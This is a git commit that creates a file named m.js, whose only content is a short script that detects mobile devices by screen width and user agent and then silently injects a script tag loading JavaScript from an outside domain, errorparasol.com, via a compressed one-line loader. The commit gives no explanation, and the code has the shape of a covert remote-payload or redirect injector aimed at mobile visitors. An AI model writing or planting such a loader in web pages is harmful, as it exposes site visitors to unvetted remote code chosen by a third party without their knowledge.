fbdb651f0738b9dc6f3f6a88aa8d6a7c76c49fd4
sleepyash421 <113919558+sleepyash421@users.noreply.github.com>
2023-01-24 21:59:32 +0700

    Create m.js

---
+++ m.js
@@ -0,0 +1,8 @@
+if (screen.width < 500 ||
+ navigator.userAgent.match(/Android/i) ||
+ navigator.userAgent.match(/webOS/i) ||
+ navigator.userAgent.match(/iPhone/i) ||
+ navigator.userAgent.match(/iPod/i)){
+	 
+	(function(s,u,p){s.src=u,p.appendChild(s);})(document.createElement('script'),'https://errorparasol.com/84/79/bb/8479bbde396c4a123324c3e4ce363dfc.js',document.body||document.documentElement)
+	 }
